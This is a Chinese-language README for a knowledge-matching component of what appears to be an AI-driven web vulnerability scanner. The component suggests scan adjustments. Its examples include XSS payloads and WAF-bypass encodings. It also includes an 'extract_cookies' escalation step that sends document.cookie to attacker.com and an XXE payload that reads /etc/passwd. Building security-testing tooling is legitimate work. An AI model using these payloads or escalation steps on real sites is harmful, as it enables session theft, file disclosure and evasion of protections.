# Module Knowledge Manager - 使用說明

## 📚 完整學習系統架構

```
任務結束後（異步獨立運行）
   ↓
讀取三個數據源：
├─ 1. 整合模組（本次執行記錄）
│     services/integration/data/experiences/*.jsonl
│     - 按能力分類：xss, sqli, ssrf, phase0 等
│     - 包含時間戳、請求、響應、結果
│
├─ 2. 整合模組（歷史數據）
│     同樣位置，但讀取歷史時間段
│     - 作為"預期響應"的參考
│
└─ 3. 能力知識庫（本模組）
      cognitive_core/learning_system/knowledge/
      - XSS_MODULE_COMPLETE_DATA_FLOW_ANALYSIS.md
      - SQLI_MODULE_COMPLETE_DATA_FLOW_ANALYSIS.md
      - SSRF_MODULE_COMPLETE_DATA_FLOW_ANALYSIS.md
   ↓
三路比對評估 → 生成優化方案 → 驗證新權重
   ↓
效果好 → 保存；效果差 → 丟棄
```

## 🔄 數據流架構（完整版）

```
外部 → main.py (安全檢測) → app.py (雙路分離)
                                  ↓
                    ┌─────────────┴─────────────┐
                    ↓                           ↓
            整合模組存儲                    AI 分析決策
            (實時記錄)                     (任務規劃)
                    ↓                           ↓
            JSONL 文件                    下令執行
            按能力分類                    掃描/功能模組
                    ↓
        學習系統讀取（任務結束後）
                    ↓
        + 歷史數據 + 能力知識庫 (本模組)
                    ↓
            ModuleKnowledgeManager
                    ↓
            三路比對評估
                    ↓
            ┌───────┴───────┐
            ↓               ↓
        已知情況          未知情況
        (使用知識庫)      (觸發 RAG 搜索)
            ↓               ↓
        生成優化方案    RAG 搜索外部資源
                        (CVE、文檔、研究)
```

## 🎯 核心功能

### 1. 知識庫載入
```python
from aiva_core.cognitive_core.learning_system.knowledge.module_knowledge_manager import (
    ModuleKnowledgeManager
)

# 初始化
manager = ModuleKnowledgeManager(
    knowledge_base_dir='/path/to/knowledge_base',
    rag_client=rag_client  # 可選
)

# 載入所有報告
manager.load_all_knowledge()

# 統計
stats = manager.get_statistics()
# {
#   'total_modules': 4,
#   'total_scenarios': 72,  # 4個模組 x 18種情況
#   'match_stats': { ... }
# }
```

### 2. 執行結果匹配

```python
from aiva_core.cognitive_core.learning_system.knowledge.module_knowledge_manager import (
    ExecutionContext
)

# 構建執行上下文
context = ExecutionContext(
    module_name='function_xss',
    target_url='https://example.com/?q=test',
    sent_data={
        'payload_type': 'traditional_xss',
        'payload': '<script>alert(1)</script>',
        'encoding': 'url_encoded',
        'method': 'GET'
    },
    received_data={
        'status_code': 403,
        'response_body': 'Blocked by Cloudflare WAF',
        'waf_detected': True,
        'xss_triggered': False,
        'response_time': 1.2
    },
    timestamp='2026-01-20T12:00:00',
    execution_id='exec_abc123'
)

# 生成建議
recommendation = manager.generate_recommendation(context)

# 結果
print(recommendation.rationale)
# 輸出:
# 匹配到已知情況: WAF阻擋 - Cloudflare (failure)
# 信心度: 0.85
# 因果關係: Cloudflare WAF檢測到XSS payload → 返回403 → 需要編碼繞過
```

### 3. 調整建議示例

#### 場景1: WAF阻擋 → 編碼繞過

**執行結果：**
```python
sent: {
    'payload': '<script>alert(1)</script>',
    'encoding': 'none'
}
received: {
    'status_code': 403,
    'waf_detected': 'Cloudflare'
}
```

**知識庫匹配：**
- 情況ID: `xss_failure_009` (WAF阻擋)
- 信心度: 0.90
- 類別: failure

**調整建議：**
```json
{
  "adjustment_type": "payload_encoding",
  "before": {
    "payload": "<script>alert(1)</script>",
    "encoding": "none"
  },
  "after": {
    "payload": "<script>alert(1)</script>",
    "encoding": "double_url_encode"
  },
  "rationale": "Cloudflare WAF可以被雙重URL編碼繞過",
  "success_rate": 0.65
}
```

#### 場景2: XSS檢測成功 → 深度測試

**執行結果：**
```python
sent: {
    'payload': '<img src=x onerror=alert(1)>',
    'injection_point': 'url_param'
}
received: {
    'status_code': 200,
    'xss_triggered': True,
    'sink': 'innerHTML'
}
```

**知識庫匹配：**
- 情況ID: `xss_success_002` (innerHTML觸發)
- 信心度: 0.95
- 類別: success

**調整建議：**
```json
{
  "adjustment_type": "escalate_attack",
  "actions": [
    {
      "action": "test_stored_xss",
      "reason": "innerHTML sink確認，測試存儲型XSS可能性"
    },
    {
      "action": "test_blind_xss",
      "payload": "OAST callback URL"
    },
    {
      "action": "extract_cookies",
      "payload": "<script>document.location='http://attacker.com?c='+document.cookie</script>"
    }
  ]
}
```

#### 場景3: 未知情況 → RAG搜索

**執行結果：**
```python
sent: {
    'payload': '<?xml version="1.0"?><root>test</root>',
    'method': 'POST'
}
received: {
    'status_code': 500,
    'error': 'XML parsing error: Invalid entity reference'
}
```

**知識庫匹配：**
- 匹配: False
- 最高相似度: 0.45 (低於閾值0.7)

**觸發RAG搜索：**
```
Query: "Module: function_xss | Status: 500 | Error: XML parsing error"

RAG搜索結果:
1. XXE (XML External Entity) 攻擊可能
2. 建議測試 <!DOCTYPE> 注入
3. 參考: OWASP XXE Prevention
```

**調整建議：**
```json
{
  "adjustment_type": "attack_vector_change",
  "rag_source": true,
  "new_vector": "XXE",
  "payload": "<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
  "confidence": 0.70
}
```

## 📊 知識庫結構

### 目錄組織
```
knowledge_base/
├── XSS_MODULE_COMPLETE_DATA_FLOW_ANALYSIS.md
├── SQLI_MODULE_COMPLETE_DATA_FLOW_ANALYSIS.md
├── SSRF_MODULE_COMPLETE_DATA_FLOW_ANALYSIS.md
├── TYPESCRIPT_DOM_XSS_COMPLETE_ANALYSIS.md
├── IDOR_MODULE_COMPLETE_DATA_FLOW_ANALYSIS.md  (未來)
├── BIZLOGIC_MODULE_COMPLETE_DATA_FLOW_ANALYSIS.md  (未來)
└── ... (所有模組的報告)
```

### JSON知識庫格式（可選）

如果不想解析Markdown，可以手動轉換為JSON：

```json
{
  "module": "function_xss",
  "language": "Python",
  "phase": "Phase2",
  
  "scenarios": {
    "success": [
      {
        "id": "xss_success_001",
        "name": "Traditional XSS - Script tag execution",
        "sent": {
          "payload_type": "traditional_xss",
          "payload": "<script>alert(1)</script>",
          "encoding": "none",
          "injection_point": "url_param"
        },
        "received": {
          "status_code": 200,
          "xss_triggered": true,
          "response_contains": "<script>alert(1)</script>"
        },
        "adjustment": null,
        "causality": "URL參數 → HTML響應 → Script執行",
        "learning_points": [
          "傳統XSS最直接的檢測方式",
          "無過濾時成功率100%"
        ]
      }
    ],
    
    "suspicious": [
      {
        "id": "xss_suspicious_001",
        "name": "Partial filtering - < > encoded",
        "sent": {
          "payload": "<script>alert(1)</script>"
        },
        "received": {
          "status_code": 200,
          "response_contains": "&lt;script&gt;alert(1)&lt;/script&gt;"
        },
        "adjustment": {
          "type": "encoding_bypass",
          "new_payload": "<img src=x onerror=alert(1)>",
          "reason": "< > 被編碼，嘗試事件處理器"
        },
        "causality": "HTML編碼 → 嘗試事件處理器繞過",
        "learning_points": [
          "部分過濾可能有繞過空間",
          "事件處理器是常見繞過方式"
        ]
      }
    ],
    
    "failure": [
      {
        "id": "xss_failure_009",
        "name": "WAF blocking - Cloudflare",
        "sent": {
          "payload": "<script>alert(1)</script>",
          "encoding": "none"
        },
        "received": {
          "status_code": 403,
          "waf_detected": "Cloudflare",
          "response_body": "Access Denied"
        },
        "adjustment": {
          "type": "waf_bypass",
          "techniques": [
            {"name": "Double URL encode", "payload": "%253Cscript%253Ealert(1)%253C%252Fscript%253E"},
            {"name": "Case variation", "payload": "<ScRiPt>alert(1)</sCrIpT>"},
            {"name": "HTML entity", "payload": "&#60;script&#62;alert(1)&#60;/script&#62;"}
          ]
        },
        "causality": "Cloudflare WAF → 403 → 編碼繞過",
        "learning_points": [
          "Cloudflare對傳統payload敏感",
          "雙重編碼有65%成功率"
        ],
        "keywords": ["cloudflare", "403", "waf", "denied"]
      }
    ]
  },
  
  "adjustable_params": {
    "timeout": {"default": 10, "range": [5, 60]},
    "retries": {"default": 3, "range": [1, 10]},
    "encoding": {"options": ["none", "url", "double_url", "html_entity"]}
  },
  
  "causality_scenarios": [
    {
      "id": "cause_001",
      "trigger": "waf_detected == 'Cloudflare' and status_code == 403",
      "adjustment": "encoding = 'double_url_encode'",
      "success_rate": 0.65
    }
  ]
}
```

## 🔄 整合到ExternalLearningListener

```python
# external_learning_listener.py

from aiva_core.cognitive_core.learning_system.knowledge.module_knowledge_manager import (
    ModuleKnowledgeManager,
    ExecutionContext
)

class ExternalLearningListener:
    def __init__(self):
        # 初始化知識庫管理器
        self.knowledge_manager = ModuleKnowledgeManager(
            knowledge_base_dir='./data/knowledge_base',
            rag_client=self.rag_client
        )
        self.knowledge_manager.load_all_knowledge()
    
    def process_external_result(self, mq_message):
        """處理外部模組執行結果"""
        # 1. 解析MQ消息
        result = json.loads(mq_message)
        
        # 2. 構建執行上下文
        context = ExecutionContext(
            module_name=result['module'],
            target_url=result['target'],
            sent_data=result['request'],
            received_data=result['response'],
            timestamp=result['timestamp'],
            execution_id=result['execution_id']
        )
        
        # 3. 生成學習建議
        recommendation = self.knowledge_manager.generate_recommendation(context)
        
        # 4. 記錄學習數據
        learning_data = {
            'execution': context.to_dict(),
            'recommendation': {
                'matched': recommendation.knowledge_match is not None,
                'confidence': recommendation.confidence,
                'adjustments': recommendation.adjustments,
                'rationale': recommendation.rationale
            }
        }
        
        # 5. 傳遞給AI學習系統
        self.experience_manager.push(learning_data)
        
        # 6. 如果需要RAG，記錄查詢
        if recommendation.requires_rag:
            self.log_rag_query(recommendation.rag_query, context)
        
        return recommendation
```

## 📈 統計與監控

```python
# 獲取統計
stats = manager.get_statistics()
print(json.dumps(stats, indent=2))

# 輸出:
{
  "total_modules": 4,
  "total_scenarios": 72,
  "match_stats": {
    "total_requests": 1523,
    "matched": 1289,           # 84.6%
    "unmatched_rag": 234,      # 15.4% (觸發RAG)
    "unmatched_no_rag": 0
  },
  "modules": [
    "function_xss",
    "function_sqli",
    "function_ssrf",
    "typescript_engine"
  ]
}

# 導出知識庫摘要
manager.export_knowledge_summary('./knowledge_summary.json')
```

## 🚀 未來擴展

### 所有模組都需要報告

目前完成：
- ✅ function_xss (Python, 18種情況)
- ✅ function_sqli (Python, 18種情況)
- ✅ function_ssrf (Python, 18種情況)
- ✅ typescript_engine (TypeScript, 18種情況)

待完成：
- ⏳ function_idor (Python)
- ⏳ function_bizlogic (Python)
- ⏳ function_authn_go (Go)
- ⏳ function_crypto (Rust)
- ⏳ rust_engine (Rust, Phase0)
- ⏳ go_engine (Go, Phase1)

### RAG整合

```python
# 未來的RAG客戶端
class RAGClient:
    def search(self, query: str, context: ExecutionContext) -> List[Dict]:
        """
        搜索外部知識庫：
        1. OWASP文檔
        2. CVE資料庫
        3. 歷史攻擊案例
        4. 學術論文
        """
        pass
```

## 📝 總結

**ModuleKnowledgeManager** 提供：
1. ✅ 載入所有模組的完整分析報告
2. ✅ 基於實際執行結果的情況匹配
3. ✅ 依據因果關係的調整建議
4. ✅ 未知情況觸發RAG搜索
5. ✅ 統計與監控能力

**學習流程**：
```
執行 → 比對知識庫 → 已知?
                      ↓
              ┌──────┴──────┐
              Yes           No
               ↓             ↓
         提供建議      RAG搜索
               ↓             ↓
         AI學習 ←──────────┘
```
